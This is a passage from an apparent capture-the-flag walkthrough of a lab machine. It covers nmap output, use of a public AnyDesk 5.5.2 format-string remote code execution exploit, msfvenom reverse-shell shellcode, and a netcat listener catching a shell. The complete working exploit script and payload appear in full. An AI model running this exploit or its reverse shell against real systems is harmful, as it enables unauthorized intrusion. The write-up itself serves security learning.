</span></span><span style=display:flex><span>Scanning <span style=color:#ae81ff>2</span> services on 10.10.235.134 <span style=color:#f92672>(</span>10.10.235.134<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Completed Service scan at 13:48, 12.71s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>2</span> services on <span style=color:#ae81ff>1</span> host<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#1) against 10.10.235.134 (10.10.235.134)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#2) against 10.10.235.134 (10.10.235.134)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#3) against 10.10.235.134 (10.10.235.134)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#4) against 10.10.235.134 (10.10.235.134)</span>
</span></span><span style=display:flex><span>Retrying OS detection <span style=color:#f92672>(</span>try <span style=color:#75715e>#5) against 10.10.235.134 (10.10.235.134)</span>
</span></span><span style=display:flex><span>Initiating Traceroute at 13:48
</span></span><span style=display:flex><span>Completed Traceroute at 13:48, 0.11s elapsed
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 13:48
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 13:48, 0.00s elapsed
</span></span><span style=display:flex><span>NSE: Script scanning 10.10.235.134.
</span></span><span style=display:flex><span>Initiating NSE at 13:48
</span></span><span style=display:flex><span>Completed NSE at 13:48, 4.29s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 13:48
</span></span><span style=display:flex><span>Completed NSE at 13:48, 0.48s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 13:48
</span></span><span style=display:flex><span>Completed NSE at 13:48, 0.00s elapsed
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.235.134 <span style=color:#f92672>(</span>10.10.235.134<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.10s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE  SERVICE         VERSION
</span></span><span style=display:flex><span>22/tcp    open   ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>7070/tcp  open   ssl/realserver?
</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>AnyDesk Client
</span></span><span style=display:flex><span>| Issuer: commonName<span style=color:#f92672>=</span>AnyDesk Client
</span></span><span style=display:flex><span>| Public Key type: rsa
</span></span><span style=display:flex><span>| Public Key bits: <span style=color:#ae81ff>2048</span>
</span></span><span style=display:flex><span>| Signature Algorithm: sha256WithRSAEncryption
</span></span><span style=display:flex><span>| Not valid before: 2022-03-23T20:04:30
</span></span><span style=display:flex><span>| Not valid after:  2072-03-10T20:04:30
</span></span><span style=display:flex><span>| MD5:   3e57 6c44 bf60 ef79 <span style=color:#ae81ff>7999</span> <span style=color:#ae81ff>8998</span> 7c8d bdf0
</span></span><span style=display:flex><span>|_SHA-1: ce6c 79fb 669d 9b19 <span style=color:#ae81ff>5382</span> 8cec c8d5 50b6 2e36 475b
</span></span><span style=display:flex><span>|_ssl-date: TLS randomness does not represent time
</span></span><span style=display:flex><span>33401/tcp closed unknown
</span></span><span style=display:flex><span>40045/tcp closed unknown
</span></span><span style=display:flex><span>No exact OS matches <span style=color:#66d9ef>for</span> host <span style=color:#f92672>(</span>If you know what OS is running on it, see https://nmap.org/submit/ <span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>TCP/IP fingerprint:
</span></span><span style=display:flex><span>OS:SCAN<span style=color:#f92672>(</span>V<span style=color:#f92672>=</span>7.92%E<span style=color:#f92672>=</span>4%D<span style=color:#f92672>=</span>8/27%OT<span style=color:#f92672>=</span>22%CT<span style=color:#f92672>=</span>33401%CU<span style=color:#f92672>=</span>35227%PV<span style=color:#f92672>=</span>Y%DS<span style=color:#f92672>=</span>2%DC<span style=color:#f92672>=</span>T%G<span style=color:#f92672>=</span>Y%TM<span style=color:#f92672>=</span><span style=color:#ae81ff>630</span>
</span></span><span style=display:flex><span>OS:9F69B%P<span style=color:#f92672>=</span>x86_64-pc-linux-gnu<span style=color:#f92672>)</span>SEQ<span style=color:#f92672>(</span>SP<span style=color:#f92672>=</span>109%GCD<span style=color:#f92672>=</span>1%ISR<span style=color:#f92672>=</span>109%TI<span style=color:#f92672>=</span>Z%CI<span style=color:#f92672>=</span>Z%II<span style=color:#f92672>=</span>I%TS<span style=color:#f92672>=</span>A
</span></span><span style=display:flex><span>OS:<span style=color:#f92672>)</span>SEQ<span style=color:#f92672>(</span>SP<span style=color:#f92672>=</span>109%GCD<span style=color:#f92672>=</span>1%ISR<span style=color:#f92672>=</span>109%TI<span style=color:#f92672>=</span>Z%CI<span style=color:#f92672>=</span>Z%TS<span style=color:#f92672>=</span>A<span style=color:#f92672>)</span>OPS<span style=color:#f92672>(</span>O1<span style=color:#f92672>=</span>M505ST11NW6%O2<span style=color:#f92672>=</span>M505ST11N
</span></span><span style=display:flex><span>OS:W6%O3<span style=color:#f92672>=</span>M505NNT11NW6%O4<span style=color:#f92672>=</span>M505ST11NW6%O5<span style=color:#f92672>=</span>M505ST11NW6%O6<span style=color:#f92672>=</span>M505ST11<span style=color:#f92672>)</span>WIN<span style=color:#f92672>(</span>W1<span style=color:#f92672>=</span>F4B3
</span></span><span style=display:flex><span>OS:%W2<span style=color:#f92672>=</span>F4B3%W3<span style=color:#f92672>=</span>F4B3%W4<span style=color:#f92672>=</span>F4B3%W5<span style=color:#f92672>=</span>F4B3%W6<span style=color:#f92672>=</span>F4B3<span style=color:#f92672>)</span>ECN<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>F507%O<span style=color:#f92672>=</span>M505
</span></span><span style=display:flex><span>OS:NNSNW6%CC<span style=color:#f92672>=</span>Y%Q<span style=color:#f92672>=)</span>T1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%S<span style=color:#f92672>=</span>O%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AS%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T2<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T3<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>N<span style=color:#f92672>)</span>T4<span style=color:#f92672>(</span>R
</span></span><span style=display:flex><span>OS:<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T5<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>OS:AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T6<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>A%A<span style=color:#f92672>=</span>Z%F<span style=color:#f92672>=</span>R%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>T7<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>Y%T<span style=color:#f92672>=</span>
</span></span><span style=display:flex><span>OS:40%W<span style=color:#f92672>=</span>0%S<span style=color:#f92672>=</span>Z%A<span style=color:#f92672>=</span>S+%F<span style=color:#f92672>=</span>AR%O<span style=color:#f92672>=</span>%RD<span style=color:#f92672>=</span>0%Q<span style=color:#f92672>=)</span>U1<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DF<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%IPL<span style=color:#f92672>=</span>164%UN<span style=color:#f92672>=</span>0%RIPL<span style=color:#f92672>=</span>G%RID
</span></span><span style=display:flex><span>OS:<span style=color:#f92672>=</span>G%RIPCK<span style=color:#f92672>=</span>G%RUCK<span style=color:#f92672>=</span>G%RUD<span style=color:#f92672>=</span>G<span style=color:#f92672>)</span>IE<span style=color:#f92672>(</span>R<span style=color:#f92672>=</span>Y%DFI<span style=color:#f92672>=</span>N%T<span style=color:#f92672>=</span>40%CD<span style=color:#f92672>=</span>S<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Uptime guess: 8.332 days <span style=color:#f92672>(</span>since Fri Aug <span style=color:#ae81ff>19</span> 05:50:26 2022<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Network Distance: <span style=color:#ae81ff>2</span> hops
</span></span><span style=display:flex><span>TCP Sequence Prediction: Difficulty<span style=color:#f92672>=</span><span style=color:#ae81ff>265</span> <span style=color:#f92672>(</span>Good luck!<span style=color:#f92672>)</span> 
</span></span><span style=display:flex><span>IP ID Sequence Generation: All zeros
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>TRACEROUTE <span style=color:#f92672>(</span>using port 40045/tcp<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>HOP RTT       ADDRESS
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>   65.90 ms  10.8.0.1 <span style=color:#f92672>(</span>10.8.0.1<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>   100.64 ms 10.10.235.134 <span style=color:#f92672>(</span>10.10.235.134<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>NSE: Script Post-scanning. 
</span></span><span style=display:flex><span>Initiating NSE at 13:48
</span></span><span style=display:flex><span>Completed NSE at 13:48, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 13:48
</span></span><span style=display:flex><span>Completed NSE at 13:48, 0.00s elapsed
</span></span><span style=display:flex><span>Initiating NSE at 13:48
</span></span><span style=display:flex><span>Completed NSE at 13:48, 0.00s elapsed
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 31.82 seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>129</span> <span style=color:#f92672>(</span>9.702KB<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>87</span> <span style=color:#f92672>(</span>6.958KB<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>The interesting port is 7070, with <code>AnyDesk Client</code> service. After googling about <code>anydesk client 7070 exploit</code> we identified this great article: <a href="https://devel0pment.de/?p=1881">https://devel0pment.de/?p=1881</a> about AnyDesk UDP version 5.5.2 Remote Code execution. A string format vulnerability is exploited on UDP port 50001. So now we are going to perform a UDP nmap scan on that port.</p><ul><li>Command: <code>sudo nmap -sU -v -p 50001 10.10.235.134</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ sudo nmap -sU -v -p <span style=color:#ae81ff>50001</span> 10.10.235.134
</span></span><span style=display:flex><span>Starting Nmap 7.92 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2022-08-27 15:40 EEST
</span></span><span style=display:flex><span>Initiating Ping Scan at 15:40
</span></span><span style=display:flex><span>Scanning 10.10.235.134 <span style=color:#f92672>[</span><span style=color:#ae81ff>4</span> ports<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed Ping Scan at 15:40, 0.13s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total hosts<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Initiating Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 15:40
</span></span><span style=display:flex><span>Completed Parallel DNS resolution of <span style=color:#ae81ff>1</span> host. at 15:40, 0.01s elapsed
</span></span><span style=display:flex><span>Initiating UDP Scan at 15:40
</span></span><span style=display:flex><span>Scanning 10.10.235.134 <span style=color:#f92672>(</span>10.10.235.134<span style=color:#f92672>)</span> <span style=color:#f92672>[</span><span style=color:#ae81ff>1</span> port<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>Completed UDP Scan at 15:40, 0.93s elapsed <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> total ports<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.235.134 <span style=color:#f92672>(</span>10.10.235.134<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.088s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT      STATE         SERVICE
</span></span><span style=display:flex><span>50001/udp open|filtered unknown
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Read data files from: /usr/bin/../share/nmap
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 1.19 seconds
</span></span><span style=display:flex><span>           Raw packets sent: <span style=color:#ae81ff>6</span> <span style=color:#f92672>(</span>288B<span style=color:#f92672>)</span> | Rcvd: <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>28B<span style=color:#f92672>)</span>
</span></span></code></pre></div><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>The UDP port 50001 is either open or filtered by a firewall. Also, in the article there is a PoC python script in order to exploit the vulnerability, which can be found also with <code>searchsploit</code> command.</p><ul><li>Command: <code>searchsploit anydesk</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ searchsploit anydesk
</span></span><span style=display:flex><span>----------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span> Exploit Title                                                         |  Path
</span></span><span style=display:flex><span>----------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation             | windows/local/40410.txt
</span></span><span style=display:flex><span>AnyDesk 5.4.0 - Unquoted Service Path                                  | windows/local/47883.txt
</span></span><span style=display:flex><span>AnyDesk 5.5.2 - Remote Code Execution                                  | linux/remote/49613.py
</span></span><span style=display:flex><span>----------------------------------------------------------------------- ---------------------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span></code></pre></div><ul><li>Command to mirror (copy) the exploit: <code>searchsploit -m linux/remote/49613.py</code></li></ul><p>We have to change the ip variable with our Annie machine IP and generate python shellcode to replace the already created in order to get a reverse shell. It is generated with <code>msfvenom</code>.</p><ul><li>Command: <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.200.50 LPORT=443 -b "\x00\x25\x26" -f python -v shellcode</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style=color:#f92672>=</span>10.8.200.50 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>443</span> -b <span style=color:#e6db74>&#34;\x00\x25\x26&#34;</span> -f python -v shellcode
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>=</span>  b<span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\x8d\x05\xef\xff\xff\xff\x48\xbb\xf1\x7c\x94&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\xa2\x97\xa9\x17\x7b\x48\x31\x58\x27\x48\x2d&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\xf8\xff\xff\xff\xe2\xf4\x9b\x55\xcc\x3b\xfd&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\xab\x48\x11\xf0\x22\x9b\xa7\xdf\x3e\x5f\xc2&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\xf3\x7c\x95\x19\x9d\xa1\xdf\x49\xa0\x34\x1d&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\x44\xfd\xb9\x4d\x11\xdb\x24\x9b\xa7\xfd\xaa&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\x49\x33\x0e\xb2\xfe\x83\xcf\xa6\x12\x0e\x07&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\x16\xaf\xfa\x0e\xe1\xac\x54\x93\x15\xfa\x8d&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\xe4\xc1\x17\x28\xb9\xf5\x73\xf0\xc0\xe1\x9e&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> b<span style=color:#e6db74>&#34;\x9d\xfe\x79\x94\xa2\x97\xa9\x17\x7b&#34;</span>
</span></span></code></pre></div><p>Then replace the shellcode in the python script with the generated one. The final version of the script should look like this:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># Exploit Title: AnyDesk 5.5.2 - Remote Code Execution</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Date: 09/06/20</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Exploit Author: scryh</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Vendor Homepage: https://anydesk.com/en</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Version: 5.5.2</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Tested on: Linux</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Walkthrough: https://devel0pment.de/?p=1881</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> struct
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;10.10.235.134&#39;</span>
</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> <span style=color:#ae81ff>50001</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>gen_discover_packet</span>(ad_id, os, hn, user, inf, func):
</span></span><span style=display:flex><span>  d  <span style=color:#f92672>=</span> chr(<span style=color:#ae81ff>0x3e</span>)<span style=color:#f92672>+</span>chr(<span style=color:#ae81ff>0xd1</span>)<span style=color:#f92672>+</span>chr(<span style=color:#ae81ff>0x1</span>)
</span></span><span style=display:flex><span>  d <span style=color:#f92672>+=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;I&#39;</span>, ad_id)
</span></span><span style=display:flex><span>  d <span style=color:#f92672>+=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;I&#39;</span>, <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>  d <span style=color:#f92672>+=</span> chr(<span style=color:#ae81ff>0x2</span>)<span style=color:#f92672>+</span>chr(os)
</span></span><span style=display:flex><span>  d <span style=color:#f92672>+=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;I&#39;</span>, len(hn)) <span style=color:#f92672>+</span> hn
</span></span><span style=display:flex><span>  d <span style=color:#f92672>+=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;I&#39;</span>, len(user)) <span style=color:#f92672>+</span> user
</span></span><span style=display:flex><span>  d <span style=color:#f92672>+=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;I&#39;</span>, <span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>  d <span style=color:#f92672>+=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;I&#39;</span>, len(inf)) <span style=color:#f92672>+</span> inf
</span></span><span style=display:flex><span>  d <span style=color:#f92672>+=</span> chr(<span style=color:#ae81ff>0</span>)
</span></span><span style=display:flex><span>  d <span style=color:#f92672>+=</span> struct<span style=color:#f92672>.</span>pack(<span style=color:#e6db74>&#39;&gt;I&#39;</span>, len(func)) <span style=color:#f92672>+</span> func
</span></span><span style=display:flex><span>  d <span style=color:#f92672>+=</span> chr(<span style=color:#ae81ff>0x2</span>)<span style=color:#f92672>+</span>chr(<span style=color:#ae81ff>0xc3</span>)<span style=color:#f92672>+</span>chr(<span style=color:#ae81ff>0x51</span>)
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> d
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.8.200.50 LPORT=443 -b &#34;\x00\x25\x26&#34; -f python -v shellcode</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>=</span>  <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x8d\x05\xef\xff\xff\xff\x48\xbb\xf1\x7c\x94</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xa2\x97\xa9\x17\x7b\x48\x31\x58\x27\x48\x2d</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf8\xff\xff\xff\xe2\xf4\x9b\x55\xcc\x3b\xfd</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xab\x48\x11\xf0\x22\x9b\xa7\xdf\x3e\x5f\xc2</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xf3\x7c\x95\x19\x9d\xa1\xdf\x49\xa0\x34\x1d</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x44\xfd\xb9\x4d\x11\xdb\x24\x9b\xa7\xfd\xaa</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x49\x33\x0e\xb2\xfe\x83\xcf\xa6\x12\x0e\x07</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x16\xaf\xfa\x0e\xe1\xac\x54\x93\x15\xfa\x8d</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\xe4\xc1\x17\x28\xb9\xf5\x73\xf0\xc0\xe1\x9e</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>shellcode <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x9d\xfe\x79\x94\xa2\x97\xa9\x17\x7b</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;sending payload ...&#39;</span>)
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> gen_discover_packet(<span style=color:#ae81ff>4919</span>, <span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x85\xfe</span><span style=color:#e6db74>%1$*1$x</span><span style=color:#e6db74>%18x</span><span style=color:#e6db74>%165$ln&#39;</span><span style=color:#f92672>+</span>shellcode, <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x85\xfe</span><span style=color:#e6db74>%18472249x</span><span style=color:#e6db74>%93$ln&#39;</span>, <span style=color:#e6db74>&#39;ad&#39;</span>, <span style=color:#e6db74>&#39;main&#39;</span>)
</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_DGRAM)
</span></span><span style=display:flex><span>s<span style=color:#f92672>.</span>sendto(p, (ip, port))
</span></span><span style=display:flex><span>s<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#39;reverse shell should connect within 5 seconds&#39;</span>)
</span></span></code></pre></div><ul><li>Command: <code>python2 49613.py</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ python2 49613.py
</span></span><span style=display:flex><span>sending payload ...
</span></span><span style=display:flex><span>reverse shell should connect within <span style=color:#ae81ff>5</span> seconds
</span></span></code></pre></div><p>Before running it, open a netcat listener on <code>443</code> port.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>geobour98@kali:~$ nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.8.200.50<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.235.134<span style=color:#f92672>]</span> <span style=color:#ae81ff>60890</span>
</span></span><span style=display:flex><span>python3 -c <span style=color:#e6db74>&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</span></span><span style=display:flex><span>annie@desktop:/home/annie$ id
